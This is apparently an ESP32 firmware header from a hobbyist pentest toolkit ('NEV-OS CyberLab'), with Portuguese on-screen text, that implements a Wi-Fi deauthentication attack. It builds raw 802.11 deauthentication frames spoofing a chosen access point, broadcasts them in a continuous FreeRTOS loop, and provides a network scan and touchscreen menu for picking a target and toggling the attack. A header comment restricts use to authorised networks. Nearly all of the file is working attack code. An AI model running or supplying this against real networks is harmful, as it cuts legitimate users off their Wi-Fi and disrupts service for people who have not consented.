/*
 * ============================================================================
 * [NEV]² - NEV-OS CyberLab v3.0
 * module_wifi_deauth.h - Wi-Fi deauthentication attack
 *
 * ATENÇÃO: Use apenas em redes/equipamentos próprios ou com autorização
 * explícita. Pentesting sem autorização é crime (Art. 154-A CP brasileiro,
 * equivalent laws in other countries).
 * ============================================================================
 */
#pragma once

#include <Arduino.h>
#include <WiFi.h>
#include <TFT_eSPI.h>
#include "config.h"
#include "types.h"
#include "ui_helpers.h"
#include "esp_wifi.h"

extern TFT_eSPI tft;
extern Network _networks[MAX_NETWORKS];
extern int wifiNetworksFound;
extern int wifiAnalyserPage;
extern AppState currentState;
extern bool isAttacking;
extern uint8_t targetAP[6];
extern uint8_t targetClient[6];

// FreeRTOS task that continuously sends deauth frames
inline void sendDeauth(uint8_t* apMac, uint8_t* clientMac) {
  uint8_t frame[26] = {
    0xc0, 0x00, 0x00, 0x00,
    0xff, 0xff, 0xff, 0xff, 0xff, 0xff,  // destination (broadcast)
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00,  // source (AP)
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00,  // BSSID
    0x00, 0x00, 0x07, 0x00               // sequence + reason (class 3 error)
  };
  memcpy(&frame[10], apMac, 6);
  memcpy(&frame[16], apMac, 6);
  esp_wifi_80211_tx(WIFI_IF_STA, frame, sizeof(frame), true);
}

inline void attackTask(void* parameter) {
  while (true) {
    if (isAttacking) {
      sendDeauth(targetAP, targetClient);
      vTaskDelay(DEAUTH_FRAME_DELAY / portTICK_PERIOD_MS);
    }
    vTaskDelay(10 / portTICK_PERIOD_MS);
  }
}

inline void drawDeauthScreen() {
  tft.fillScreen(COLOR_BG);
  drawHeader("Deauth Attack", true);

  // Status panel
  drawPanel(20, 30, 280, 50);
  tft.setTextColor(COLOR_TEXT);
  tft.setTextSize(1);
  tft.setCursor(30, 42);
  tft.print("Status:");
  tft.setTextColor(isAttacking ? COLOR_DANGER : COLOR_PRIMARY);
  tft.setCursor(80, 42);
  tft.print(isAttacking ? "ATIVO" : "IDLE");

  // Target panel
  drawPanel(20, 90, 280, 50);
  tft.setTextColor(COLOR_TEXT);
  tft.setCursor(30, 102);
  tft.print("Alvo:");
  tft.setTextColor(COLOR_WARN);
  tft.setCursor(70, 102);
  if (targetAP[0] == 0 && targetAP[1] == 0) {
    tft.print("(nenhum)");
  } else {
    char mac[18];
    snprintf(mac, sizeof(mac), "%02X:%02X:%02X:%02X:%02X:%02X",
             targetAP[0], targetAP[1], targetAP[2],
             targetAP[3], targetAP[4], targetAP[5]);
    tft.print(mac);
  }

  // Action button
  int btnY = 160;
  tft.fillRoundRect(60, btnY, 200, 40, 8, isAttacking ? 0x4208 : COLOR_PANEL_BG);
  tft.drawRoundRect(60, btnY, 200, 40, 8, isAttacking ? COLOR_DANGER : COLOR_PRIMARY);
  drawCenteredText(isAttacking ? "PARAR ATAQUE" : "INICIAR ATAQUE", btnY + 14,
                   isAttacking ? COLOR_DANGER : COLOR_PRIMARY, 2);

  // Network selector hint
  drawStatusBar("Curto:seleciona rede  Longo:toggle ataque");
}

inline void enterWifiDeauth() {
  currentState = STATE_WIFI_DEAUTH;
  // ensure scan happened; if not, do it now
  if (wifiNetworksFound <= 0) {
    WiFi.mode(WIFI_STA);
    WiFi.disconnect();
    delay(100);
    WiFi.scanDelete();
    wifiNetworksFound = WiFi.scanNetworks(false, true);
    for (int i = 0; i < wifiNetworksFound && i < MAX_NETWORKS; i++) {
      String s = WiFi.SSID(i);
      strncpy(_networks[i].ssid, s.c_str(), sizeof(_networks[i].ssid) - 1);
      _networks[i].ssid[sizeof(_networks[i].ssid) - 1] = '\0';
      _networks[i].ch = WiFi.channel(i);
      _networks[i].rssi = WiFi.RSSI(i);
      _networks[i].enc = WiFi.encryptionType(i);
      memcpy(_networks[i].bssid, WiFi.BSSID(i), 6);
    }
  }
  drawDeauthScreen();
}

inline void renderDeauthNetList() {
  tft.fillScreen(COLOR_BG);
  drawHeader("Selecionar Alvo", true);
  tft.setTextColor(COLOR_TEXT);
  tft.setCursor(10, 30);
  tft.printf("%d redes. Toque longo para escolher.", wifiNetworksFound);

  int startY = 50;
  int itemH = 30;
  uint8_t sel = wifiAnalyserPage;  // reuse as selection
  for (int i = 0; i < 5 && i < wifiNetworksFound && i < MAX_NETWORKS; i++) {
    int y = startY + i * itemH;
    bool isSel = (i == sel);
    if (isSel) {
      tft.drawRoundRect(10, y, 300, itemH - 2, 4, COLOR_WARN);
    } else {
      tft.drawRoundRect(10, y, 300, itemH - 2, 4, COLOR_BORDER);
    }
    tft.setTextColor(isSel ? COLOR_WARN : COLOR_TEXT);
    tft.setCursor(15, y + 8);
    char buf[20];
    strncpy(buf, _networks[i].ssid, sizeof(buf)-1);
    buf[sizeof(buf)-1] = '\0';
    tft.print(buf);
    tft.setCursor(220, y + 8);
    tft.printf("Ch:%2d", _networks[i].ch);
  }
  drawStatusBar("Curto:proximo  Longo:selecionar  Longo BACK:voltar");
}

inline void handleDeauthShort() {
  // Cycle through networks
  if (wifiNetworksFound > 0) {
    wifiAnalyserPage = (wifiAnalyserPage + 1) % min((int)wifiNetworksFound, 5);
    renderDeauthNetList();
  }
}

inline void handleDeauthLong() {
  if (targetAP[0] != 0 || targetAP[1] != 0) {
    // Stop attack if running
    isAttacking = false;
    delay(100);
  }
  // Pick the currently-selected network
  if (wifiNetworksFound > 0 && wifiAnalyserPage < MAX_NETWORKS) {
    memcpy(targetAP, _networks[wifiAnalyserPage].bssid, 6);
    memset(targetClient, 0xff, 6);  // broadcast
    isAttacking = !isAttacking;  // toggle
  } else {
    isAttacking = !isAttacking;
  }
  drawDeauthScreen();
}
